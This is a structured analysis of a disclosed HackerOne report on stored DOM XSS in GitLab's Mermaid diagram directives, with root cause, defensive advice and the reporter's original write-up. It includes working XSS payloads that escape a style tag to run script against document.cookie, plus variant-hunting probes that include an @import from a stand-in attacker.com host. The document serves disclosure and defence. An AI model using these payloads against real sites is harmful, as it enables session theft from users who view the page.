# Stored DOM XSS via Mermaid Chart Directives

## Metadata
- **Source:** HackerOne
- **Report:** 1103258 | https://hackerone.com/reports/1103258
- **Submitted:** 2021-02-14
- **Reporter:** taraszelyk
- **Program:** GitLab
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Stored Cross-Site Scripting (XSS), DOM-based XSS, Improper Input Sanitization, Unsafe innerHTML Usage
- **CVEs:** None
- **Category:** web-api

## Summary
GitLab's integration of Mermaid diagram library fails to sanitize user-supplied directives, allowing attackers to inject malicious CSS and HTML payloads. The vulnerability exists in Mermaid 8.6.0+ where directive parameters are directly concatenated into style tags via innerHTML without validation, enabling stored XSS attacks that execute when any user views the affected diagram.

## Attack scenario
1. Attacker creates a GitLab issue or embeds a Mermaid diagram in any GFM-supported content
2. Attacker includes a malicious directive with payload in fontFamily, altFontFamily, or themeCSS parameters: %%{init: {'fontFamily': '"></style><img src=x onerror=alert(document.cookie)>'}}%%
3. Attacker saves the issue/content, storing the XSS payload in GitLab's database
4. Victim navigates to the issue page or views the diagram in any context
5. Browser parses the Mermaid diagram and merges directive parameters into CSS without sanitization
6. Malicious HTML/JavaScript executes in victim's browser context with access to session cookies and sensitive data

## Root cause
Mermaid library concatenates user-supplied directive values directly into CSS rules and injects them via innerHTML without escaping or sanitizing HTML special characters. The vulnerable code pattern is: `userStyles += `\n:root { --mermaid-font-family: ${cnf.fontFamily}}`; followed by `style1.innerHTML = rules;` The attacker breaks out of the CSS context using `"></style>` to inject arbitrary HTML.

## Attacker mindset
Attacker recognized that new Mermaid directives feature (v8.6.0) provided direct access to style generation without sanitization. By understanding the CSS injection point and innerHTML behavior, they crafted a payload to escape the style context and inject arbitrary HTML/JavaScript. The stored nature makes this a high-impact persistence mechanism requiring no user interaction beyond viewing.

## Defensive takeaways
- Never use innerHTML with user-controlled data; use textContent, createTextNode(), or DOM API alternatives
- Sanitize and validate all user inputs before CSS injection, especially string interpolation in style attributes
- Implement strict Content Security Policy (CSP) with script-src 'none' for user-generated content contexts
- Use CSS-in-JS libraries with built-in sanitization or template literal validation for dynamic styling
- Apply output encoding: HTML-encode special characters (<, >, ", ') when concatenating user input into HTML attributes
- Validate directive parameters against a whitelist of safe values rather than blocklisting
- Consider parsing user directives into structured objects and applying transformations through safe APIs
- Implement defense-in-depth: sanitize at input, validate at processing, and encode at output layers

## Variant hunting
Test other CSS properties that accept user input (themeVariables, other theme parameters) for similar injection
Probe for JavaScript protocol handlers: `fontFamily: 'javascript:alert(1)'` variations
Attempt CSS @import injection to load external malicious stylesheets: `@import url('http://attacker.com/evil.css')`
Test SVG-based payload injection within Mermaid diagram elements beyond directive parameters
Investigate if themeCSS parameter (explicitly mentioned as user-provided) has identical vulnerability
Check for bypass techniques using CSS escaping: `\3c script\3e` or Unicode encoding
Test comment-based injection: `fontFamily: '*/ } <img src=x onerror=alert(1)> /*'`
Examine if other Mermaid configuration options merged without sanitization could be exploited
Verify if Content Security Policy bypass is possible through CSS injection (e.g., style-src self variations)

## MITRE ATT&CK
- T1190
- T1598
- T1566
- T1204
- T1499

## Notes
Reporter noted that GitLab's CSP mitigates client-side execution but indicated potential CSP bypass techniques. The vulnerability is particularly dangerous in collaborative platforms where diagrams are embedded in issues, PRs, and wiki pages. The Mermaid library is widely used across projects, making this a supply-chain adjacent risk. Local instances without CSP are fully exploitable. The fix should be applied at both Mermaid library level and GitLab's integration layer to prevent regression.

## Full report
<details><summary>Expand</summary>

## Prologue

Gitlab supports Mermaid as part of GFM to allow users to generate diagrams and flowcharts from text.

In version 8.6.0, Mermaid added a support of directives to add more control over styles(themes) applied to the diagrams.

You can read more about how this works here: https://mermaid-js.github.io/mermaid/#/directives

Syntax for declaring the directive is `%%{init: {<JSON_OBJECT>}}%%`

Directives can be used to overwrite default theme properties like `fontFamily` or `fontSize` to the graph.

Behind the scenes, library takes `JSON_OBJECT` from directive and merges it with config object. Later that config is used to generate new CSS rules:

```
  let userStyles = '';
  // user provided theme CSS
  if (cnf.themeCSS !== undefined) {
    userStyles += `\n${cnf.themeCSS}`;
  }
  // user provided theme CSS
  if (cnf.fontFamily !== undefined) {
    userStyles += `\n:root { --mermaid-font-family: ${cnf.fontFamily}}`;
  }
  // user provided theme CSS
  if (cnf.altFontFamily !== undefined) {
    userStyles += `\n:root { --mermaid-alt-font-family: ${cnf.altFontFamily}}`;
  }
```

## Vulnerability description

Problem is that there is no sanitization of user-supplied values, which are added to `style` tag via `innerHTML` method afterwards:
```
  const stylis = new Stylis();
  const rules = stylis(`#${id}`, getStyles(graphType, userStyles, cnf.themeVariables));

  const style1 = document.createElement('style');
  style1.innerHTML = rules;
  svg.insertBefore(style1, firstChild);
```

This leads to Cross-Site Scripting attack via following directive:
```
%%{init: { 'fontFamily': '\"></style><img src=x onerror=alert(document.cookie)>'} }%%
```
## Steps to reproduce

1. Create an issue in any repository
2. Create mermaid diagram with following payload:
```
%%{init: { 'fontFamily': '\"></style><img src=x onerror=alert(document.cookie)>'} }%%
sequenceDiagram
Alice->>Bob: Hi Bob
Bob->>Alice: Hi Alice
```

3. Save the issue. XSS will be triggered every time a user opens a page with this issue.

## PoC
Visit https://gitlab.com/bugbountyuser1/asdf/-/issues/3
You will see CSP errors in the console. 

{F1195539}

## What is the current *bug* behavior?

Mermaid fails to properly sanitize user-supplied input via directive which leads to XSS.

## What is the expected *correct* behavior?

Mermaid strips/encodes malicious characters, so there is no way to perform XSS attack.

## Output of checks

This vulnerability was tested on gitlab.com. CSP blocks XSS from executing, but I have an idea on how to bypass CSP.
On a local Gitlab instance with a newer version(same as gitlab.com) of Mermaid, it works too.

### Results of GitLab environment info

(For installations with omnibus-gitlab package run and paste the output of:
`sudo gitlab-rake gitlab:env:info`)

(For installations from source run and paste the output of:
`sudo -u git -H bundle exec rake gitlab:env:info RAILS_ENV=production`)

## Impact

The Impact is standard as for any Stored XSS. User interaction is minimal - the user needs to navigate to a page with a Mermaid chart(issues page, etc). CSP is blocking XSS on gitlab.com, but I can work on XSS bypass if it is needed to show the impact/increase bounty amount. So let me know if you need CSP bypass too.

</details>

---
*Analysed by Claude on 2026-05-12*
